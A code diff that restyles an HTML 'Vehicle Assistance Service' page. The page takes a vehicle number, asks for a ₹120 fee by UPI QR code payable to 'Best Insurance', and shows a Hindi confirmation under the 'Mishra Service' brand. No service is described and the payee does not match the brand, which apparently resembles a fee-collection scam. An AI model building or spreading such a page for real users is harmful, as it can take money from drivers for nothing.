@@ -6,122 +6,97 @@
 <title>Vehicle Assistance Service</title>
 
 <style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:Segoe UI,Arial;}
+*{
+box-sizing:border-box;
+margin:0;
+padding:0;
+font-family:Segoe UI,Arial;
+}
 
 body{
 min-height:100vh;
 display:flex;
-align-items:center;
+flex-direction:column;
 justify-content:center;
-background:linear-gradient(-45deg,#1d2b64,#f8cdda,#1fa2ff,#12d8fa);
-background-size:400% 400%;
-animation:gradient 12s ease infinite;
+align-items:center;
+background:linear-gradient(135deg,#4facfe,#00f2fe);
+padding:20px;
+animation:bgMove 8s ease infinite alternate;
 }
 
-@keyframes gradient{
-0%{background-position:0% 50%}
-50%{background-position:100% 50%}
-100%{background-position:0% 50%}
+@keyframes bgMove{
+0%{filter:brightness(1);}
+100%{filter:brightness(1.1);}
 }
 
 .card{
-width:95%;
+width:100%;
 max-width:420px;
-backdrop-filter:blur(15px);
-background:rgba(255,255,255,0.15);
-padding:30px;
-border-radius:20px;
-box-shadow:0 10px 40px rgba(0,0,0,0.3);
-color:white;
-position:relative;
+background:white;
+border-radius:24px;
+padding:28px;
+box-shadow:0 20px 50px rgba(0,0,0,0.15);
+text-align:center;
 animation:fadeIn .6s ease;
 }
 
 @keyframes fadeIn{
-from{opacity:0;transform:translateY(15px)}
-to{opacity:1;transform:translateY(0)}
+from{opacity:0;transform:translateY(20px);}
+to{opacity:1;transform:translateY(0);}
 }
 
 h2{
-margin-bottom:15px;
+margin-bottom:18px;
+color:#1d2b64;
 font-weight:600;
 }
 
 input,button{
 width:100%;
-padding:14px;
-margin-top:12px;
-border:none;
-border-radius:12px;
+padding:15px;
+margin-top:14px;
+border-radius:14px;
 font-size:15px;
-}
-
-input{
-background:rgba(255,255,255,0.2);
-color:white;
-outline:none;
-}
-
-input::placeholder{color:#eee;}
-
-button{
-background:white;
-color:#1d2b64;
-font-weight:600;
-cursor:pointer;
 transition:.3s;
 }
 
+input{
+border:1px solid #ddd;
+}
+
+input:focus{
+border-color:#4facfe;
+box-shadow:0 0 0 3px rgba(79,172,254,0.2);
+outline:none;
+}
+
+button{
+background:#1d2b64;
+color:white;
+font-weight:600;
+border:none;
+cursor:pointer;
+box-shadow:0 8px 18px rgba(29,43,100,0.25);
+}
+
 button:hover{
-transform:scale(1.03);
+transform:translateY(-2px);
+box-shadow:0 12px 22px rgba(29,43,100,0.3);
+}
+
+button:active{
+transform:scale(.98);
+}
+
+img{
+width:210px;
+margin:18px auto;
+display:block;
+border-radius:18px;
+box-shadow:0 10px 25px rgba(0,0,0,0.15);
 }
 
 .hidden{display:none;}
-
-img{
-width:200px;
-margin:15px auto;
-display:block;
-border-radius:14px;
-}
-
-/* Top bar */
-.top{
-position:absolute;
-top:15px;
-left:15px;
-right:15px;
-display:flex;
-justify-content:space-between;
-}
-
-.home{
-background:white;
-color:black;
-padding:6px 12px;
-border-radius:8px;
-font-size:13px;
-cursor:pointer;
-}
-
-.menu{
-font-size:22px;
-cursor:pointer;
-}
-
-.dropdown{
-position:absolute;
-top:50px;
-right:10px;
-background:white;
-color:black;
-padding:12px;
-border-radius:12px;
-width:220px;
-display:none;
-font-size:13px;
-box-shadow:0 5px 20px rgba(0,0,0,0.2);
-}
 
 /* Loader */
 .loader{
@@ -130,7 +105,7 @@ top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(0,0,0,0.8);
+background:rgba(0,0,0,0.85);
 display:none;
 align-items:center;
 justify-content:center;
@@ -155,11 +130,25 @@ margin-bottom:20px;
 to{transform:rotate(360deg);}
 }
 
+/* Success animation */
+.successIcon{
+font-size:55px;
+animation:pop .4s ease;
+}
+
+@keyframes pop{
+from{transform:scale(0);}
+to{transform:scale(1);}
+}
+
+/* Footer */
 .footer{
-margin-top:20px;
+margin-top:30px;
+max-width:420px;
 text-align:center;
 font-size:13px;
-color:white;
+color:#222;
+line-height:1.7;
 opacity:0.9;
 }
 </style>
@@ -174,32 +163,18 @@ opacity:0.9;
 
 <div class="card">
 
-<div class="top">
-<div class="home" onclick="goHome()">🏠 Home</div>
-<div class="menu" onclick="toggleMenu()">☰</div>
-</div>
-
-<div class="dropdown" id="menuBox">
-<b>About:</b><br>
-Premium Vehicle Assistance Platform<br><br>
-<b>Disclaimer:</b><br>
-Private service platform. Not affiliated with any government authority.
-</div>
-
-<!-- PAGE 1 -->
 <div id="p1">
 <h2>Enter Vehicle Number</h2>
 <input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
 <button onclick="goPay()">Continue</button>
 </div>
 
-<!-- PAGE 2 -->
 <div id="p2" class="hidden">
 <h2>Service Fee ₹120</h2>
 
 <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi%3A%2F%2Fpay%3Fpa%3Dbestinsurance%40upi%26pn%3DBest%20Insurance%26am%3D120.00%26cu%3DINR">
 
-<p style="text-align:center;">UPI: bestinsurance@upi</p>
+<p><strong>UPI:</strong> bestinsurance@upi</p>
 
 <button onclick="openUPI()">Pay with UPI</button>
 
@@ -209,10 +184,10 @@ Private service platform. Not affiliated with any government authority.
 <button onclick="submitForm()">Submit</button>
 </div>
 
-<!-- PAGE 3 -->
 <div id="p3" class="hidden">
-<h2>🎉 Congratulations!</h2>
-<p style="margin-top:10px;">
+<div class="successIcon">🎉</div>
+<h2>Congratulations!</h2>
+<p style="margin-top:12px;">
 मुझे आपकी request मिल गई है।<br>
 हम जल्द ही आपसे संपर्क करेंगे।
 </p>
@@ -222,16 +197,17 @@ Private service platform. Not affiliated with any government authority.
 </div>
 
 <div class="footer">
+<b>About:</b><br>
+Independent Vehicle Assistance Platform<br><br>
+
+<b>Disclaimer:</b><br>
+This is a private service platform and not affiliated with any government authority.<br><br>
+
 © 2026 Mishra Service<br>
 Independent Digital Assistance Platform
 </div>
 
 <script>
-
-function toggleMenu(){
-let box=document.getElementById("menuBox");
-box.style.display = box.style.display==="block"?"none":"block";
-}
 
 function showLoader(text){
 document.getElementById("loaderText").innerHTML=text;
